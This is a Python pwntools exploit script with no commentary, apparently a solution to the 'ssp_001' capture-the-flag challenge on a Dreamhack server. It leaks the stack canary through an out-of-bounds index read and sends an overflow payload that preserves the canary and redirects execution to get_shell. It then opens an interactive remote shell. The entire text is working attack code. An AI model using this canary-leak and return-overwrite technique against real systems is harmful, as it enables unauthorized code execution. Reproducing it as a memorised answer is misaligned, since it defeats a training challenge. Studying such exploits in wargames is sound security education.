from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p=remote("host3.dreamhack.games", 21859)
e = ELF("./ssp_001")

get_shell = e.symbols['get_shell']
canary=b""
i = 131
while i >= 128:
  p.sendlineafter("> ", 'P')
  p.sendlineafter("Element index : ", str(i))
  p.recvuntil("is : ")
  canary += p.recvn(2)
  i = i - 1
	
canary=int(canary, 16)
slog("canary", canary)

payload = b'A' * 64
payload += p32(canary)
payload += b'A' * 8
payload += p32(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()
